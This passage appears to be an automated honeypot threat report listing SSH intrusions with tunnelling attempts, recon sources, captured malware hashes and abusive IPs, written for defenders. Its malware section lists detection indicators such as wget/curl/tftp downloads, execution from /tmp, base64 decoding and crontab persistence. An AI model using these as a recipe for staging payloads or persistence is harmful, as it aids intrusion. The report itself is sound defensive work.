| `2026-07-26 12:17:30` | `cowrie.session.connect` |
| `2026-07-26 12:17:31` | `cowrie.client.version` |
| `2026-07-26 12:17:31` | `cowrie.client.kex` |
| `2026-07-26 12:17:32` | `cowrie.login.success` |
| `2026-07-26 12:17:33` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]92` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-390c9ecd49f1

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 12:34 |
| **Last Seen** | 2026-07-26 12:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:34:35` | `cowrie.session.connect` |
| `2026-07-26 12:34:35` | `cowrie.client.version` |
| `2026-07-26 12:34:35` | `cowrie.client.kex` |
| `2026-07-26 12:34:35` | `cowrie.login.success` |
| `2026-07-26 12:34:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:34:35` | `cowrie.direct-tcpip.data` |
| `2026-07-26 12:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3834812003b3

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-07-26 12:42 |
| **Last Seen** | 2026-07-26 12:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:42:30` | `cowrie.session.connect` |
| `2026-07-26 12:42:30` | `cowrie.client.version` |
| `2026-07-26 12:42:30` | `cowrie.client.kex` |
| `2026-07-26 12:42:31` | `cowrie.login.success` |
| `2026-07-26 12:42:31` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae05d1e185fc

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-07-26 12:42 |
| **Last Seen** | 2026-07-26 12:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:42:40` | `cowrie.session.connect` |
| `2026-07-26 12:42:40` | `cowrie.client.version` |
| `2026-07-26 12:42:40` | `cowrie.client.kex` |
| `2026-07-26 12:42:41` | `cowrie.login.success` |
| `2026-07-26 12:42:41` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2454fd5bcb95

| Field | Detail |
|---|---|
| **Source IP** | `115.46.88[.]68` |
| **First Seen** | 2026-07-26 12:45 |
| **Last Seen** | 2026-07-26 12:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:45:35` | `cowrie.session.connect` |
| `2026-07-26 12:45:36` | `cowrie.client.version` |
| `2026-07-26 12:45:36` | `cowrie.client.kex` |
| `2026-07-26 12:45:38` | `cowrie.login.success` |
| `2026-07-26 12:45:39` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.46.88[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.46.88[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b03c1daabac

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-07-26 12:45 |
| **Last Seen** | 2026-07-26 12:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:45:47` | `cowrie.session.connect` |
| `2026-07-26 12:45:48` | `cowrie.client.version` |
| `2026-07-26 12:45:48` | `cowrie.client.kex` |
| `2026-07-26 12:45:50` | `cowrie.login.success` |
| `2026-07-26 12:45:50` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44fc0e1982a6

| Field | Detail |
|---|---|
| **Source IP** | `14.33.96[.]3` |
| **First Seen** | 2026-07-26 12:46 |
| **Last Seen** | 2026-07-26 12:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:46:00` | `cowrie.session.connect` |
| `2026-07-26 12:46:01` | `cowrie.client.version` |
| `2026-07-26 12:46:01` | `cowrie.client.kex` |
| `2026-07-26 12:46:02` | `cowrie.login.success` |
| `2026-07-26 12:46:03` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.96[.]3` to AbuseIPDB if not already reported
- [ ] Block `14.33.96[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5dbc21e5cca

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 12:47 |
| **Last Seen** | 2026-07-26 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:47:13` | `cowrie.session.connect` |
| `2026-07-26 12:47:13` | `cowrie.client.version` |
| `2026-07-26 12:47:13` | `cowrie.client.kex` |
| `2026-07-26 12:47:14` | `cowrie.login.success` |
| `2026-07-26 12:47:14` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:47:14` | `cowrie.direct-tcpip.data` |
| `2026-07-26 12:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b88395d9dca

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-07-26 12:50 |
| **Last Seen** | 2026-07-26 12:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:50:23` | `cowrie.session.connect` |
| `2026-07-26 12:50:24` | `cowrie.client.version` |
| `2026-07-26 12:50:24` | `cowrie.client.kex` |
| `2026-07-26 12:50:27` | `cowrie.login.success` |
| `2026-07-26 12:50:28` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda51d34d85d

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-07-26 12:50 |
| **Last Seen** | 2026-07-26 12:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 12:50:34` | `cowrie.session.connect` |
| `2026-07-26 12:50:35` | `cowrie.client.version` |
| `2026-07-26 12:50:35` | `cowrie.client.kex` |
| `2026-07-26 12:50:37` | `cowrie.login.success` |
| `2026-07-26 12:50:37` | `cowrie.direct-tcpip.request` |
| `2026-07-26 12:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **12** | 2026-07-26 09:42 | 2026-07-26 12:50 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-26 09:14 | 2026-07-26 12:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **6** | 2026-07-26 11:46 | 2026-07-26 12:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-07-26 10:21 | 2026-07-26 10:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-26 10:42 | 2026-07-26 10:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-07-26 09:16 | 2026-07-26 09:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **3** | 2026-07-26 09:04 | 2026-07-26 10:43 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `41.168.10[.]139` | **3** | 2026-07-26 11:04 | 2026-07-26 12:12 | 2m | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]7` | **2** | 2026-07-26 11:41 | 2026-07-26 11:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-26 10:26 | 2026-07-26 10:29 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]45` | **2** | 2026-07-26 11:44 | 2026-07-26 11:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.157.40[.]219` | 1 | 2026-07-26 11:52 | 2026-07-26 11:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.36.57[.]69` | 1 | 2026-07-26 11:00 | 2026-07-26 11:00 | 1s | 0 | `T1592` | 🟢 LOW |
| `115.212.78[.]3` | 1 | 2026-07-26 12:42 | 2026-07-26 12:42 | 12s | 0 | `T1592` | 🟢 LOW |
| `121.202.198[.]98` | 1 | 2026-07-26 10:20 | 2026-07-26 10:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `122.187.230[.]38` | 1 | 2026-07-26 10:45 | 2026-07-26 10:45 | 7s | 0 | `T1592` | 🟢 LOW |
| `125.227.240[.]43` | 1 | 2026-07-26 09:36 | 2026-07-26 09:36 | 3s | 0 | `T1592` | 🟢 LOW |
| `190.52.48[.]239` | 1 | 2026-07-26 11:16 | 2026-07-26 11:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-26 09:14 | 2026-07-26 09:15 | 39s | 0 | `T1592` | 🟢 LOW |
| `212.8.39[.]72` | 1 | 2026-07-26 12:21 | 2026-07-26 12:21 | 12s | 0 | `T1592` | 🟢 LOW |
| `218.219.125[.]191` | 1 | 2026-07-26 11:24 | 2026-07-26 11:25 | 31s | 0 | `T1592` | 🟢 LOW |
| `219.144.80[.]143` | 1 | 2026-07-26 09:20 | 2026-07-26 09:20 | 1s | 0 | `T1592` | 🟢 LOW |
| `39.130.240[.]179` | 1 | 2026-07-26 10:22 | 2026-07-26 10:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-07-26 10:35 | 2026-07-26 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-07-26 12:35 | 2026-07-26 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-07-26 11:47 | 2026-07-26 11:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-07-26 12:35 | 2026-07-26 12:35 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-26 11:33 | 2026-07-26 11:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-07-26 11:40 | 2026-07-26 11:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]40` | 1 | 2026-07-26 12:01 | 2026-07-26 12:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]30` | 1 | 2026-07-26 09:02 | 2026-07-26 09:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]4` | 1 | 2026-07-26 12:45 | 2026-07-26 12:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]122` | 1 | 2026-07-26 10:39 | 2026-07-26 10:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]122` | 1 | 2026-07-26 10:39 | 2026-07-26 10:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-07-26 09:57 | 2026-07-26 09:58 | 10s | 0 | `T1592` | 🟢 LOW |
| `75.142.102[.]219` | 1 | 2026-07-26 12:36 | 2026-07-26 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-07-26 09:33 | 2026-07-26 09:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.92.47[.]53` | 1 | 2026-07-26 09:36 | 2026-07-26 09:36 | 8s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]210` | 1 | 2026-07-26 11:46 | 2026-07-26 11:46 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `175.198.18[.]3` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `182.75.197[.]174` | IN | Devbhumi Broadcast Pvt Ltd | **100** ⚠️ | 50 |
| `223.210.27[.]53` | CN | BeiJing Guoxin bilin Telecom Technology Co.,Ltd | **100** ⚠️ | 50 |
| `208.109.38[.]143` | US | GoDaddy.com, LLC | **100** ⚠️ | 50 |
| `45.79.207[.]252` | US | Linode | **100** ⚠️ | 50 |
| `91.92.47[.]53` | NL | TechTies Inc. | **100** ⚠️ | 24 |
| `45.79.207[.]181` | US | Linode | **100** ⚠️ | 50 |
